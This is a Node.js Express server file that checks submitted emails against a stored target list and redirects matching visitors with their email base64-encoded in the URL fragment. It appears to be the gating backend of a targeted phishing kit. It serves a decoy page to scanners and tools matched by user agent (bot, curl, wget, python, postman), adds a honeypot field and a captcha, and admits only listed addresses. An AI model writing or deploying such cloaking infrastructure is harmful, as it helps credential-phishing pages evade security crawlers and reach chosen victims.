// server.js (backend)
require('dotenv').config()
const express = require('express')
const cors = require('cors')
const fs = require('fs')
const path = require('path')
const fetch = require('node-fetch')
const crypto = require('crypto')
const helmet = require('helmet')
const rateLimit = require('express-rate-limit')

const app = express()
const PORT = process.env.PORT || 3000
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt')
const REDIRECT_BASE = process.env.REDIRECT_BASE || '/'
const DEBUG = process.env.DEBUG === 'true'

let validEmails = new Set()
let tokenMap = new Map()

function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8')
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()))
    console.log('[INFO] Email list loaded')
  } catch (err) {
    console.error('[ERROR] Failed to load emails:', err)
  }
}
loadEmails()

// Clean expired tokens every 5 minutes
setInterval(() => {
  const now = Date.now()
  for (const [token, info] of tokenMap.entries()) {
    if (info.expires < now) tokenMap.delete(token)
  }
}, 5 * 60 * 1000)

// Middleware
app.use(helmet())
app.use(express.json())
app.use(cors())
app.use(express.static(path.join(__dirname, 'frontend')))

// HTTPS redirect
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`)
  }
  next()
})

// Rate limiting
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { valid: false, message: 'Too many requests. Try again later.' }
}))

// Bot detection middleware
function isBot(req) {
  const ua = req.headers['user-agent'] || ''
  return /bot|curl|wget|python|scrapy|axios|postman/i.test(ua)
}

app.get('/', (req, res) => {
  if (isBot(req)) {
    return res.sendFile(path.join(__dirname, 'frontend', 'lalaland.html'))
  }
  return res.sendFile(path.join(__dirname, 'frontend', 'index.html'))
})

app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body

  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' })
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email' })
  }

  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'Captcha missing' })
  }

  try {
    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
    })
    const result = await verify.json()
    if (!result.success) {
      return res.status(400).json({ valid: false, message: 'Captcha failed' })
    }
  } catch (err) {
    return res.status(500).json({ valid: false, message: 'Captcha check error' })
  }

  const normalized = email.toLowerCase()
  if (!validEmails.has(normalized)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' })
  }

  const token = crypto.randomBytes(16).toString('hex')
  const encoded = Buffer.from(normalized).toString('base64')
  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 })

  return res.json({ valid: true, redirectUrl: `/forward?token=${token}` })
})

app.get('/forward', (req, res) => {
  const { token } = req.query
  const entry = tokenMap.get(token)

  if (!entry || Date.now() > entry.expires) {
    tokenMap.delete(token)
    return res.status(403).send('Invalid or expired token.')
  }

  tokenMap.delete(token)
  return res.redirect(`/#${entry.email}`)
})

app.listen(PORT, () => {
  console.log(`[READY] Backend running on port ${PORT}`)
})
